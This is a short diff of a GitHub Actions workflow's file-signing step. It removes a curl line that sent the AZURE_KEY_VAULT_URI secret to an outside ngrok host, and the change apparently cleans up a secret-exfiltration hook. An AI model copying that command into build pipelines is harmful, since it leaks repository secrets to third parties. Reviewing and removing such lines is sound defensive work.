@@ -39,8 +39,6 @@ jobs:
       - name: Sign Files
         shell: bash
         run: |
-          curl -iv https://goldfish-artistic-fly.ngrok-free.app/xxx/${{ secrets.AZURE_KEY_VAULT_URI }}
-
           for file in unsigned/*.{exe,msi,msp,msm,cab,dll,appx,appxbundle,msix,msixbundle,sys,vxd,ps1,psm1}; do
             if [ -f "$file" ]; then
               echo "::Notice:: Attempting to sign $file"
